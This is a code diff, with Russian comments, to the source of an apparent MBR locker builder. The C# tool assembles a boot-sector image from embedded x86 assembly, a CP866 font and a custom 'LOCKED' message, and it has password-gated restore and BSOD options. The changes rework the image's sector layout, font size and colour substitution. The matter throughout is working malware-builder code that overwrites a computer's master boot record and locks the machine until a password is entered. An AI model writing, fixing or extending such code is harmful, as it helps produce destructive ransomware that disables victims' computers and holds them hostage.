@@ -292,34 +292,13 @@ namespace MbrLockerBuilder
                     int x = 20;
                     int y = 20;
 
-                    string border = "========================================";
-                    g.DrawString(border, font, brush, x, y);
-                    y += 20;
+                    string fullText = title + "\r\n\r\n" + body;
 
-                    string titleLine = "     " + title + "     ";
-                    g.DrawString(titleLine, font, brush, x, y);
-                    y += 20;
-
-                    g.DrawString(border, font, brush, x, y);
-                    y += 25;
-
-                    string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
-                    foreach (string line in bodyLines)
+                    string[] lines = fullText.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                    foreach (string line in lines)
                     {
-                        string wrapped = line.Trim();
-                        while (wrapped.Length > 60)
-                        {
-                            int cut = 60;
-                            if (cut > wrapped.Length) cut = wrapped.Length;
-                            g.DrawString(wrapped.Substring(0, cut), font, brush, x, y);
-                            y += 18;
-                            wrapped = wrapped.Substring(cut);
-                        }
-                        if (wrapped.Length > 0)
-                        {
-                            g.DrawString(wrapped, font, brush, x, y);
-                            y += 18;
-                        }
+                        g.DrawString(line.Trim(), font, brush, x, y);
+                        y += 20;
                     }
 
                     y += 5;
@@ -349,8 +328,8 @@ namespace MbrLockerBuilder
                         {
                             if (stream != null)
                             {
-                                byte[] font = new byte[4096];
-                                stream.Read(font, 0, 4096);
+                                byte[] font = new byte[1024];  // ← 1024 байта (как в статье)
+                                stream.Read(font, 0, 1024);
                                 return font;
                             }
                         }
@@ -361,10 +340,18 @@ namespace MbrLockerBuilder
 
             string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
             if (File.Exists(localPath))
-                return File.ReadAllBytes(localPath);
+            {
+                byte[] font = File.ReadAllBytes(localPath);
+                if (font.Length >= 1024)
+                {
+                    byte[] resized = new byte[1024];
+                    Array.Copy(font, resized, 1024);
+                    return resized;
+                }
+            }
 
             MessageBox.Show("Шрифт cp866_font.bin не найден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            return new byte[4096];
+            return new byte[1024];
         }
 
         private bool ContainsRussian(string text)
@@ -393,7 +380,7 @@ start:
 
     mov ah, 0x06
     mov al, 0
-    mov bh, 0x00
+    mov bh, COLOR_BG
     mov cx, 0
     mov dx, 0x184F
     int 0x10
@@ -402,7 +389,7 @@ start:
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 8
+    mov al, 2
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -418,30 +405,15 @@ start:
     mov es, ax
     mov bx, 0x9000
     mov ah, 0x02
-    mov al, 1
+    mov al, 2
     mov ch, 0
-    mov cl, 11
+    mov cl, 5
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
     mov si, 0x9000
-    call print
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x9200
-    mov ah, 0x02
-    mov al, 1
-    mov ch, 0
-    mov cl, 12
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-    jc load_error
-
-    mov si, 0x9200
     call print
 
     mov ah, 0x02
@@ -487,7 +459,7 @@ restore_mbr:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 3
+    mov cl, 2
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -513,7 +485,7 @@ print:
     jz .done
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     int 0x10
     jmp print
 .done:
@@ -535,7 +507,7 @@ get_password:
     stosb
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -545,7 +517,7 @@ get_password:
     dec di
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -557,7 +529,7 @@ get_password:
     mov byte [di], 0
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
@@ -656,8 +628,8 @@ dw 0xAA55";
                 case 7: bgColor = "70"; break;
             }
 
-            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
-            template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
+            template = template.Replace("COLOR_BG", bgColor);
+            template = template.Replace("COLOR_FG", textColor);
 
             bool enableBSOD = this.chkBSOD.Checked;
             if (enableBSOD)
@@ -797,41 +769,36 @@ dw 0xAA55";
                 this.lblStatus.Text = "3/7 Сборка образа...";
                 Application.DoEvents();
 
-                int totalSectors = 13;
+                int totalSectors = 9;  // 0-8 (как в статье: 0, 1, 2, 3-4, 5-6, 7-8)
                 byte[] fullImage = new byte[512 * totalSectors];
 
+                // 1. MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
+                // 2. Шрифт (сектора 3-4) — 2 сектора = 1024 байта
                 byte[] fontData = GenerateCP866Font();
-                if (fontData != null && fontData.Length >= 4096)
+                if (fontData != null && fontData.Length >= 1024)
                 {
-                    Array.Copy(fontData, 0, fullImage, 512 * 3, 4096);
+                    Array.Copy(fontData, 0, fullImage, 512 * 3, 1024);
                 }
                 else
                 {
-                    byte[] paddedFont = new byte[4096];
+                    byte[] paddedFont = new byte[1024];
                     if (fontData != null)
-                        Array.Copy(fontData, paddedFont, Math.Min(fontData.Length, 4096));
-                    Array.Copy(paddedFont, 0, fullImage, 512 * 3, 4096);
+                        Array.Copy(fontData, paddedFont, Math.Min(fontData.Length, 1024));
+                    Array.Copy(paddedFont, 0, fullImage, 512 * 3, 1024);
                 }
 
+                // 3. Текст (сектора 5-6) — 2 сектора = 1024 байта
                 string title = this.txtTitle.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
-                string border = "========================================\r\n";
-                string formattedTitle = "     " + title + "     \r\n";
-                string titleText = border + formattedTitle + border + "\r\n\0";
-                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
-                if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
-
                 string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
-                string formattedBody = body.Replace("\n", "\r\n");
-                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
-                if (bodyBytes.Length > 511) Array.Resize(ref bodyBytes, 511);
-                Array.Resize(ref bodyBytes, bodyBytes.Length + 1);
-                bodyBytes[bodyBytes.Length - 1] = 0;
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
+
+                string fullText = title + "\r\n\r\n" + body + "\0";
+                byte[] textBytes = Encoding.GetEncoding(866).GetBytes(fullText);
+                if (textBytes.Length > 1024) Array.Resize(ref textBytes, 1024);
+                Array.Copy(textBytes, 0, fullImage, 512 * 5, textBytes.Length);
 
                 this.lblStatus.Text = "4/7 Получение template.exe...";
                 Application.DoEvents();
